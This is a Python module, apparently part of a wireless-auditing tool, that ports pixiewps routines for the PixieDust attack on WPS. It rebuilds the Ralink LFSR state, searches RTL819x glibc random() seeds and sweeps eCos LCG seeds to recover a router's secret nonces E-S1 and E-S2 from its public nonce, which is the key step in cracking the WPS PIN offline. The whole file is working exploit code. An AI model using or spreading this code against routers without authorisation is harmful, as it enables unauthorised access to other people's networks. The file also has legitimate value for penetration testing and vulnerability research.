"""Weak-PRNG ports for PixieDust secret-nonce recovery: Ralink LFSR, RTL819x/eCos glibc
``random()``, and the eCos LCG. Pure functions (no crypto, no I/O), safe to run in a worker
process. Ported byte-for-byte from pixiewps (wiire-a/pixiewps, GPL-3.0) and verified against
its reference output (see tests/campaigns/data/pixie_prng_vectors.json); the RTL819x generator
also reproduces the canonical glibc ``srandom(1)`` sequence.
"""

from __future__ import annotations

import struct
from typing import List, Optional, Tuple

_U32 = 0xFFFFFFFF

# pixiewps glibc_random_yura.c: precomputed coefficients of the glibc TYPE_3 additive PRNG,
# letting the first four 31-bit outputs be read as linear combinations of the seed.
_GLIBC_TBL = (
    0x0128e83b, 0x00dafa31, 0x009f4828, 0x00f66443, 0x00bee24d, 0x00817005, 0x00cb918f,
    0x00a64845, 0x0069c3cf, 0x00a76dbd, 0x0090a848, 0x0057025f, 0x0089126c, 0x007d9a8f,
    0x0048252a, 0x006fb2d4, 0x006ccc15, 0x003c5744, 0x005a998f, 0x005df917, 0x0032ed77,
    0x00492688, 0x0050e901, 0x002b5f57, 0x003acd0b, 0x00456b7a, 0x0025413d, 0x002f11f4,
    0x003b564d, 0x00203f14, 0x002589fc, 0x003283f8, 0x001c17e4, 0x001dd823,
)

RALINK_TAP = 0x80000057


def _glibc_words(seed: int, reductions: int) -> List[int]:
    """The four 31-bit glibc output words for ``seed``. ``reductions`` is the per-step
    mod-(2^31-1) passes: 1 reproduces pixiewps ``rtl_nonce_fill``, 2 its ``glibc_fast_nonce``."""
    w0 = w1 = w2 = w3 = 0
    s = seed
    for j in range(31):
        w0 += s * _GLIBC_TBL[j + 3]
        w1 += s * _GLIBC_TBL[j + 2]
        w2 += s * _GLIBC_TBL[j + 1]
        w3 += s * _GLIBC_TBL[j]
        p = 16807 * s
        p = (p >> 31) + (p & 0x7FFFFFFF)
        s = (p >> 31) + (p & 0x7FFFFFFF) if reductions == 2 else p
    return [(w0 & _U32) >> 1, (w1 & _U32) >> 1, (w2 & _U32) >> 1, (w3 & _U32) >> 1]


def rtl_nonce_fill(seed: int) -> bytes:
    """The 16-byte nonce/secret RTL819x generates for ``seed`` (pixiewps ``rtl_nonce_fill``)."""
    return b"".join(struct.pack(">I", w) for w in _glibc_words(seed, 1))


def glibc_fast_nonce(seed: int) -> bytes:
    """The 16-byte nonce used to match the Enrollee nonce in the seed search."""
    return b"".join(struct.pack(">I", w) for w in _glibc_words(seed, 2))


def glibc_fast_seed(seed: int) -> int:
    """Only the first output word (quick filter before the full-nonce compare)."""
    w0 = 0
    s = seed
    for j in range(3, 33):
        w0 += s * _GLIBC_TBL[j]
        p = 16807 * s
        p = (p >> 31) + (p & 0x7FFFFFFF)
        s = (p >> 31) + (p & 0x7FFFFFFF)
    return ((w0 + s * _GLIBC_TBL[33]) & _U32) >> 1


def rtl_find_nonce_seed(e_nonce: bytes, start: int, end: int) -> Optional[int]:
    """Search ``[end, start]`` (walked high→low, as pixiewps does) for the seed whose glibc
    nonce equals ``e_nonce``; ``None`` if none in range. Caller bounds the window (seconds)."""
    target0 = struct.unpack(">I", e_nonce[:4])[0]
    lo = min(start, end)
    for seed in range(max(start, end), lo - 1, -1):
        if glibc_fast_seed(seed) == target0 and glibc_fast_nonce(seed) == e_nonce:
            return seed
    return None


# ----- Ralink LFSR (pixiewps, non-MIPS reference branch) --------------------

def _ralink_randbyte(state: List[int]) -> int:
    sreg = state[0]
    r = 0
    for _ in range(8):
        if sreg & 1:
            sreg = (((sreg ^ RALINK_TAP) >> 1) | 0x80000000) & _U32
            bit = 1
        else:
            sreg = (sreg >> 1) & _U32
            bit = 0
        r = ((r << 1) | bit) & 0xFF
    state[0] = sreg
    return r


def _ralink_restore(state: List[int], r: int) -> None:
    sreg = state[0]
    for _ in range(8):
        bit = r & 1
        r >>= 1
        if bit:
            sreg = (((sreg << 1) ^ RALINK_TAP) | 1) & _U32
        else:
            sreg = (sreg << 1) & _U32
    state[0] = sreg


def _ralink_randbyte_backwards(state: List[int]) -> int:
    sreg = state[0]
    r = 0
    for i in range(8):
        if sreg & 0x80000000:
            sreg = (((sreg << 1) ^ RALINK_TAP) | 1) & _U32
            bit = 1
        else:
            sreg = (sreg << 1) & _U32
            bit = 0
        r |= bit << i
    state[0] = sreg
    return r & 0xFF


def ralink_recover(e_nonce: bytes) -> Optional[Tuple[bytes, bytes]]:
    """Reconstruct (E-S1, E-S2) for a Ralink/MediaTek Enrollee from its nonce alone: rebuild the
    LFSR state and read the two secrets that preceded the nonce. ``None`` if the nonce cannot have
    come from this LFSR. Deterministic, no brute force."""
    if len(e_nonce) != 16:
        return None
    state = [0]
    for i in range(15, -1, -1):
        _ralink_restore(state, e_nonce[i])
    saved = state[0]
    check = [saved]
    if any(_ralink_randbyte(check) != e_nonce[j] for j in range(16)):
        return None
    state[0] = saved
    es2 = [0] * 16
    for i in range(15, -1, -1):
        es2[i] = _ralink_randbyte_backwards(state)
    es1 = [0] * 16
    for i in range(15, -1, -1):
        es1[i] = _ralink_randbyte_backwards(state)
    return bytes(es1), bytes(es2)


def ralink_forward_stream(sreg: int, nbytes: int) -> bytes:
    """``nbytes`` of the Ralink LFSR output from initial state ``sreg`` (for tests / modelling)."""
    state = [sreg & _U32]
    return bytes(_ralink_randbyte(state) for _ in range(nbytes))


# ----- eCos "simple" LCG (pixiewps mode 2, experimental) --------------------
# The seed sweep is 2^25, so callers keep this off the default live path.

def ecos_rand_simple(seed: int) -> Tuple[int, int]:
    """One eCos "simple" draw: returns (value, next_seed) (pixiewps ``ecos_rand_simple``)."""
    s = (seed * 1103515245 + 12345) & _U32
    uret = s & 0xFFE00000
    s = (s * 1103515245 + 12345) & _U32
    uret = (uret + ((s & 0xFFFC0000) >> 11)) & _U32
    s = (s * 1103515245 + 12345) & _U32
    uret = (uret + ((s & 0xFE000000) >> 25)) & _U32
    return uret, s


def ecos_simple_model(seed: int) -> Tuple[bytes, bytes, bytes]:
    """Model a vulnerable eCos Enrollee as (e_nonce, E-S1, E-S2): nonce byte 0 is the seed's top 7
    bits, bytes 1-15 and both secrets are consecutive draws. For tests / vector construction."""
    nonce = bytearray(16)
    nonce[0] = (seed >> 25) & 0x7F
    s = seed
    for i in range(1, 16):
        v, s = ecos_rand_simple(s)
        nonce[i] = v & 0xFF
    secrets = []
    for _ in range(2):
        buf = bytearray()
        for _ in range(16):
            v, s = ecos_rand_simple(s)
            buf.append(v & 0xFF)
        secrets.append(bytes(buf))
    return bytes(nonce), secrets[0], secrets[1]


def ecos_simple_recover(e_nonce: bytes, max_counter: int = 0x02000000) -> Optional[Tuple[bytes, bytes]]:
    """(E-S1, E-S2) for an eCos "simple" Enrollee: the top 7 seed bits come from nonce[0], then
    sweep the low 25 bits until the draws reproduce nonce[1:]. ``None`` if unfound in range."""
    if len(e_nonce) != 16:
        return None
    known = (e_nonce[0] << 25) & _U32
    for counter in range(max_counter):
        s = known | counter
        for i in range(1, 16):
            v, s = ecos_rand_simple(s)
            if (v & 0xFF) != e_nonce[i]:
                break
        else:
            secrets = []
            for _ in range(2):
                buf = bytearray()
                for _ in range(16):
                    v, s = ecos_rand_simple(s)
                    buf.append(v & 0xFF)
                secrets.append(bytes(buf))
            return secrets[0], secrets[1]
    return None
